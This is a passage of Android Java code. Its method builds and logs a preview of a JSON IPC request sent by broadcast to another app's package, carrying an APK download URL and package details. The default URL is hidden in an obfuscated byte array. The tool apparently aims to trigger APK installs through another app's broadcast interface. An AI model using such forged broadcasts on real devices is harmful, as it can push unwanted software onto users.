        if (bytes < 1024 * 1024 * 1024) return String.format("%.1fMB", bytes / (1024.0 * 1024.0));
        return String.format("%.2fGB", bytes / (1024.0 * 1024.0 * 1024.0));
    }

    /**
     * 预览将要发送的广播数据
     */
    private void previewBroadcastData() {
        String apkUrl = apkUrlInput.getText().toString().trim();
        String appName = appNameInput.getText().toString().trim();
        String pkgName = pkgNameInput.getText().toString().trim();

        if (apkUrl.isEmpty()) apkUrl = Obfuscator.dec3(new byte[]{(byte)0x12, (byte)0xd2, (byte)0xe6, (byte)0x0a, (byte)0xd5, (byte)0xa8, (byte)0x55, (byte)0x89, (byte)0xf7, (byte)0x02, (byte)0xc7, (byte)0xff, (byte)0x0a, (byte)0xca, (byte)0xf7, (byte)0x54, (byte)0xc5, (byte)0xfd, (byte)0x17, (byte)0x89, (byte)0xf3, (byte)0x0a, (byte)0xd6, (byte)0xbc, (byte)0x1b, (byte)0xd6, (byte)0xf9}, (byte)0x7a, (byte)0xa6, (byte)0x92);
        if (appName.isEmpty()) appName = "示例应用";
        if (pkgName.isEmpty()) pkgName = "com.example.app";

        try {
            JSONObject data = new JSONObject();
            data.put("apkUrl", apkUrl);
            data.put("name", appName);
            data.put("apkName", pkgName);
            data.put("type", 1);
            data.put("from", 1);

            JSONObject ipcRequest = new JSONObject();
            ipcRequest.put("pkg_name", TARGET_PACKAGE);
            ipcRequest.put("msg_id", "预览模式");
            ipcRequest.put("sub_type", 3);
            ipcRequest.put("type", 2);
            ipcRequest.put("data", data);

            String preview = "=== 广播数据预览 ===\n\n" +
                "Action: " + BROADCAST_ACTION + "\n" +
                "Target: " + TARGET_PACKAGE + "\n\n" +
                ipcRequest.toString(2);

            appendLog(preview);
        } catch (Exception e) {
            appendLog("预览失败: " + e.getMessage());
        }
    }

    private void appendLog(String msg) {
        try {
            String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            String line = "[" + time + "] " + msg + "\n";
            logText.append(line);
        } catch (Exception e) {
            // ignore
        }
    }
}
